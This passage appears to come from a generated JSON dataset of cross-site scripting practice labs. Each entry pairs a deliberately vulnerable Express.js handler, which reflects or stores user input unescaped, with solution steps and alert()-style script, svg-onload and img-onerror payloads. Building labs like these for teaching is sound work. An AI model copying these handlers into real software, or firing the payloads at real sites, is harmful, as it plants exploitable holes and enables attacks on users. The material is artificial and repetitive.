        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter email: <script>alert('SubXSS')</script>.",
            "Observe script execution after subscription confirmation."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h3>Thank you for subscribing, ${email}</h3>`);\n});",
        "payloads": [
            "<script>alert('SubXSS')</script>",
            "<svg/onload=alert('Subscribe')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in internal ticket system ticket notes",
        "Lab Description": "Technicians can add notes to tickets. Notes are stored without sanitization, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add ticket note: <script>alert('TicketNote')</script>.",
            "View the ticket details page and trigger XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-ticket-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO ticket_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
        "payloads": [
            "<script>alert('TicketNote')</script>",
            "<img src=x onerror=alert('TicketXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in document sharing form",
        "Lab Description": "Document sharing confirmation page reflects input fields without sanitization, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Share document with custom message: <script>alert('DocShare')</script>.",
            "Confirm payload triggers on confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/share-document', (req, res) => {\n  const message = req.body.message;\n  res.send(`<div>Shared with message: ${message}</div>`);\n});",
        "payloads": [
            "<script>alert('DocShare')</script>",
            "<svg/onload=alert('DocShare')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in music streaming app playlist comments",
        "Lab Description": "Users can comment on playlists. Comments are stored without escaping, allowing persistent XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Comment on a playlist: <script>alert('Playlist')</script>.",
            "View the playlist to trigger XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-playlist-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO playlist_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
        "payloads": [
            "<script>alert('Playlist')</script>",
            "<img src=x onerror=alert('PlaylistXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online recipe submission form",
        "Lab Description": "The recipe submission confirmation page reflects recipe names without encoding, causing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit a recipe name: <script>alert('RecipeXSS')</script>.",
            "Observe script execution on confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const recipeName = req.body.name;\n  res.send(`<div>Recipe submitted: ${recipeName}</div>`);\n});",
        "payloads": [
            "<script>alert('RecipeXSS')</script>",
            "<svg/onload=alert('RecipeXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in team collaboration chat",
        "Lab Description": "Team members can post chat messages, but the application renders messages without sanitization, leading to persistent XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post message: <script>alert('ChatXSS')</script>.",
            "Reload chat room and observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-message', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO chat_messages (content) VALUES (?)\", [message]);\n  res.send('Message sent');\n});",
        "payloads": [
            "<script>alert('ChatXSS')</script>",
            "<img src=x onerror=alert('Chat')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in invoice creation tool",
        "Lab Description": "The invoice generation form reflects customer names without sanitization in the final invoice view, allowing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit customer name: <script>alert('Invoice')</script>.",
            "Trigger script execution in the invoice preview."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-invoice', (req, res) => {\n  const customer = req.body.customer;\n  res.send(`<h2>Invoice for: ${customer}</h2>`);\n});",
        "payloads": [
            "<script>alert('Invoice')</script>",
            "<svg/onload=alert('Invoice')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug tracker ticket comments",
        "Lab Description": "Users can comment on tickets without any output escaping, allowing stored XSS payloads.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post ticket comment: <script>alert('BugXSS')</script>.",
            "Observe payload execution when viewing the ticket."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
        "payloads": [
            "<script>alert('BugXSS')</script>",
            "<img src=x onerror=alert('Bug')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online quiz result page",
        "Lab Description": "After submitting an online quiz, the result page reflects the user's name without sanitization, enabling reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit name: <script>alert('Quiz')</script>.",
            "Observe execution in quiz results."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-quiz', (req, res) => {\n  const name = req.body.name;\n  res.send(`<div>Quiz Completed by: ${name}</div>`);\n});",
        "payloads": [
            "<script>alert('Quiz')</script>",
            "<svg/onload=alert('Quiz')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in employee management notes",
        "Lab Description": "Employee management system allows adding notes to profiles without sanitization, causing stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add note: <script>alert('Employee')</script> to a profile.",
            "View the employee profile to trigger XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-employee-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO employee_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
        "payloads": [
            "<script>alert('Employee')</script>",
            "<img src=x onerror=alert('EmployeeNote')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in contact us form confirmation",
        "Lab Description": "The 'Contact Us' form reflects the submitted message directly without sanitization, causing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit message: <script>alert('ContactXSS')</script>.",
            "Trigger the script on confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const message = req.body.message;\n  res.send(`<p>Your message: ${message}</p>`);\n});",
        "payloads": [
            "<script>alert('ContactXSS')</script>",
            "<svg/onload=alert('Contact')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in course review system",
        "Lab Description": "Students can post course reviews that are rendered without escaping, causing persistent XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post a course review: <script>alert('CourseXSS')</script>.",
            "View the course page to trigger payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO course_reviews (review) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
        "payloads": [
            "<script>alert('CourseXSS')</script>",
            "<img src=x onerror=alert('Course')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter subscription form",
        "Lab Description": "User input is reflected in the newsletter subscription confirmation page without escaping, causing XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Subscribe with email: <script>alert('Newsletter')</script>.",
            "Observe script execution after subscription."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe-newsletter', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h2>Welcome ${email}!</h2>`);\n});",
        "payloads": [
            "<script>alert('Newsletter')</script>",
            "<svg/onload=alert('Newsletter')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in travel booking special requests",
        "Lab Description": "Travel booking site allows special requests input without sanitization, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add special request: <script>alert('Booking')</script>.",
            "Trigger script when viewing booking summary."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-special-request', (req, res) => {\n  const request = req.body.request;\n  db.query(\"INSERT INTO special_requests (request) VALUES (?)\", [request]);\n  res.send('Request saved');\n});",
        "payloads": [
            "<script>alert('Booking')</script>",
            "<img src=x onerror=alert('Travel')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in blog comment reply form",
        "Lab Description": "Blog reply form reflects user input without sanitization, causing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Reply to a comment with: <script>alert('Reply')</script>.",
            "Observe execution when reply page loads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reply-comment', (req, res) => {\n  const reply = req.body.reply;\n  res.send(`<p>Reply: ${reply}</p>`);\n});",
        "payloads": [
            "<script>alert('Reply')</script>",
            "<svg/onload=alert('Reply')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online auction item description",
        "Lab Description": "Users can list auction items with custom descriptions. The application stores and renders them without sanitization, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "List an item with description: <script>alert('AuctionXSS')</script>.",
            "Reload auction page and observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-auction', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO auctions (description) VALUES (?)\", [description]);\n  res.send('Auction created');\n});",
        "payloads": [
            "<script>alert('AuctionXSS')</script>",
            "<img src=x onerror=alert('Auction')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in customer order tracking page",
        "Lab Description": "The order tracking page reflects the provided order ID without sanitization, allowing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Track order with ID: <script>alert('Order')</script>.",
            "Observe script execution in tracking page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/track-order', (req, res) => {\n  const orderId = req.body.orderId;\n  res.send(`<div>Tracking Order: ${orderId}</div>`);\n});",
        "payloads": [
            "<script>alert('Order')</script>",
            "<svg/onload=alert('Order')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in real estate listing notes",
        "Lab Description": "Agents can add notes to real estate listings. The notes are displayed without sanitization, leading to persistent XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add listing note: <script>alert('RealEstate')</script>.",
            "View listing to trigger XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-listing-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO listing_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
        "payloads": [
            "<script>alert('RealEstate')</script>",
            "<img src=x onerror=alert('Listing')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online appointment confirmation",
        "Lab Description": "Appointment booking system reflects customer name without sanitization, causing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Book appointment with name: <script>alert('Appointment')</script>.",
            "Observe payload execution on confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-appointment', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Appointment confirmed for: ${name}</p>`);\n});",
        "payloads": [
            "<script>alert('Appointment')</script>",
            "<svg/onload=alert('Appointment')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in gym membership feedback",
        "Lab Description": "Members can submit feedback about facilities, which is displayed without escaping, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit feedback: <script>alert('GymFeedback')</script>.",
            "Reload feedback section and observe XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO feedbacks (text) VALUES (?)\", [feedback]);\n  res.send('Feedback received');\n});",
        "payloads": [
            "<script>alert('GymFeedback')</script>",
            "<img src=x onerror=alert('Gym')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in job application form",
        "Lab Description": "Job application form reflects applicant name back without proper escaping, causing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit application with name: <script>alert('Applicant')</script>.",
            "Observe execution on acknowledgment page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-application', (req, res) => {\n  const applicant = req.body.applicant;\n  res.send(`<div>Application received from: ${applicant}</div>`);\n});",
        "payloads": [
            "<script>alert('Applicant')</script>",
            "<svg/onload=alert('Applicant')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in ticket booking comments",
        "Lab Description": "Ticket booking site allows comments for each booking, stored without escaping, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add comment: <script>alert('TicketComment')</script>.",
            "Trigger script on ticket detail page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-ticket-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO ticket_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
        "payloads": [
            "<script>alert('TicketComment')</script>",
            "<img src=x onerror=alert('Ticket')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in feedback review page",
        "Lab Description": "Reviewing feedback entries reflects user input directly without sanitization, allowing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit feedback containing: <script>alert('FeedbackReview')</script>.",
            "Observe execution when feedback page loads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/review-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<h2>Feedback: ${feedback}</h2>`);\n});",
        "payloads": [
            "<script>alert('FeedbackReview')</script>",
            "<svg/onload=alert('Review')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in community forum new post",
        "Lab Description": "Users can create new forum posts, but content is stored without escaping, enabling stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create post with content: <script>alert('ForumPost')</script>.",
            "Reload forum thread to trigger XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/new-post', (req, res) => {\n  const post = req.body.post;\n  db.query(\"INSERT INTO forum_posts (content) VALUES (?)\", [post]);\n  res.send('Post published');\n});",
        "payloads": [
            "<script>alert('ForumPost')</script>",
            "<img src=x onerror=alert('Post')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online ticket support form",
        "Lab Description": "Support ticket form reflects ticket titles directly without sanitization, causing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit ticket title: <script>alert('SupportTicket')</script>.",
            "Observe execution on support page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  const title = req.body.title;\n  res.send(`<div>Ticket Submitted: ${title}</div>`);\n});",
        "payloads": [
            "<script>alert('SupportTicket')</script>",
            "<svg/onload=alert('Ticket')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online course platform announcement",
        "Lab Description": "Course instructors can post announcements. The announcement body is stored without sanitization, enabling stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post an announcement with: <script>alert('CourseXSS')</script>.",
            "Reload the course page and observe XSS execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-announcement', (req, res) => {\n  const announcement = req.body.announcement;\n  db.query(\"INSERT INTO announcements (text) VALUES (?)\", [announcement]);\n  res.send('Announcement posted');\n});",
        "payloads": [
            "<script>alert('CourseXSS')</script>",
            "<img src=x onerror=alert('Course')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in password reset hint",
        "Lab Description": "Password reset form reflects user-provided security hint without sanitization, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit a hint: <script>alert('ResetXSS')</script>.",
            "Observe execution on confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-hint', (req, res) => {\n  const hint = req.body.hint;\n  res.send(`<div>Your security hint: ${hint}</div>`);\n});",
        "payloads": [
            "<script>alert('ResetXSS')</script>",
            "<svg/onload=alert('Hint')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in product return reason form",
        "Lab Description": "Customers submit reasons for returning products. Inputs are stored without sanitization, allowing stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit reason: <script>alert('ReturnXSS')</script>.",
            "Trigger XSS by visiting return detail page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-return', (req, res) => {\n  const reason = req.body.reason;\n  db.query(\"INSERT INTO returns (reason) VALUES (?)\", [reason]);\n  res.send('Return submitted');\n});",
        "payloads": [
            "<script>alert('ReturnXSS')</script>",
            "<img src=x onerror=alert('Return')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter subscription confirmation",
        "Lab Description": "Newsletter subscription confirmation page reflects the subscriber's email without escaping, leading to XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Subscribe with email: <script>alert('NewsletterXSS')</script>.",
            "Observe payload execution after subscription."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe-newsletter', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Subscribed with: ${email}</p>`);\n});",
        "payloads": [
            "<script>alert('NewsletterXSS')</script>",
            "<svg/onload=alert('Newsletter')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in internal HR feedback form",
        "Lab Description": "Employees submit internal feedback that is stored without validation, leading to stored XSS on HR portal.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit feedback: <script>alert('HRFeedback')</script>.",
            "View HR feedback dashboard to trigger XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-hr-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO hr_feedback (feedback) VALUES (?)\", [feedback]);\n  res.send('Feedback submitted');\n});",
        "payloads": [
            "<script>alert('HRFeedback')</script>",
            "<img src=x onerror=alert('HR')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online donation thank-you message",
        "Lab Description": "Donation thank-you page reflects donor name without sanitization, enabling reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Donate with name: <script>alert('Donation')</script>.",
            "Observe execution in thank-you message."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/donate', (req, res) => {\n  const donor = req.body.donor;\n  res.send(`<h2>Thank you, ${donor}!</h2>`);\n});",
        "payloads": [
            "<script>alert('Donation')</script>",
            "<svg/onload=alert('Donate')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in CRM contact notes",
        "Lab Description": "CRM system stores client notes without sanitization, leading to persistent XSS when sales reps view notes.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add contact note: <script>alert('CRM')</script>.",
            "View contact to trigger payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-contact-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO contact_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
        "payloads": [
            "<script>alert('CRM')</script>",
            "<img src=x onerror=alert('CRMContact')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in complaint submission system",
        "Lab Description": "Customer complaints are echoed back without escaping, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit complaint text: <script>alert('Complaint')</script>.",
            "Observe script execution after submission."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-complaint', (req, res) => {\n  const complaint = req.body.complaint;\n  res.send(`<div>Your complaint: ${complaint}</div>`);\n});",
        "payloads": [
            "<script>alert('Complaint')</script>",
            "<svg/onload=alert('Complaint')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in company knowledge base article comments",
        "Lab Description": "Users can comment on internal knowledge base articles. Comments are stored and rendered without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit comment: <script>alert('KnowledgeBase')</script>.",
            "Reload article and observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment-article', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO kb_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment posted');\n});",
        "payloads": [
            "<script>alert('KnowledgeBase')</script>",
            "<img src=x onerror=alert('KB')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online certificate name input",
        "Lab Description": "Certificate generation form reflects the provided name without escaping, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit name: <script>alert('Certificate')</script>.",
            "Observe execution on generated certificate preview."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-certificate', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Certificate for: ${name}</h1>`);\n});",
        "payloads": [
            "<script>alert('Certificate')</script>",
            "<svg/onload=alert('Cert')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event management system attendee comments",
        "Lab Description": "Attendees can leave public comments on event pages. Comments are stored without sanitization, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit comment: <script>alert('EventXSS')</script>.",
            "Reload event page and observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO event_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
        "payloads": [
            "<script>alert('EventXSS')</script>",
            "<img src=x onerror=alert('Event')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in book review website search field",
        "Lab Description": "Book search queries are reflected into the search results page without encoding, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Search for: <script>alert('BookSearch')</script>.",
            "Observe script execution in results page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-books', (req, res) => {\n  const search = req.body.search;\n  res.send(`<h2>Results for: ${search}</h2>`);\n});",
        "payloads": [
            "<script>alert('BookSearch')</script>",
            "<svg/onload=alert('Book')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online doctor appointment notes",
        "Lab Description": "Patients can leave notes for doctors while booking appointments. Notes are stored without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit note: <script>alert('DoctorXSS')</script>.",
            "Doctor views appointment and triggers XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO appointment_notes (note) VALUES (?)\", [note]);\n  res.send('Note submitted');\n});",
        "payloads": [
            "<script>alert('DoctorXSS')</script>",
            "<img src=x onerror=alert('Doctor')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in course enrollment form",
        "Lab Description": "After filling course enrollment, user details are reflected back without encoding, enabling reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit enrollment name: <script>alert('EnrollXSS')</script>.",
            "Check confirmation page for script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/enroll', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h3>Welcome ${name}!</h3>`);\n});",
        "payloads": [
            "<script>alert('EnrollXSS')</script>",
            "<svg/onload=alert('Enroll')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in real estate listing descriptions",
        "Lab Description": "Real estate agents can create property listings with descriptions. Descriptions are not sanitized before display.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit listing with: <script>alert('RealEstate')</script>.",
            "View listing page to trigger payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-listing', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO listings (description) VALUES (?)\", [description]);\n  res.send('Listing created');\n});",
        "payloads": [
            "<script>alert('RealEstate')</script>",
            "<img src=x onerror=alert('Listing')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online ticket booking platform",
        "Lab Description": "User-submitted names for ticket bookings are reflected into a receipt page without sanitization.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Book ticket with name: <script>alert('TicketXSS')</script>.",
            "Observe payload execution on ticket page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-ticket', (req, res) => {\n  const passenger = req.body.passenger;\n  res.send(`<h1>Ticket for ${passenger}</h1>`);\n});",
        "payloads": [
            "<script>alert('TicketXSS')</script>",
            "<svg/onload=alert('Ticket')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in fitness tracker app custom achievements",
        "Lab Description": "Users can create custom achievements in a fitness app. Achievement names are not sanitized before rendering.",
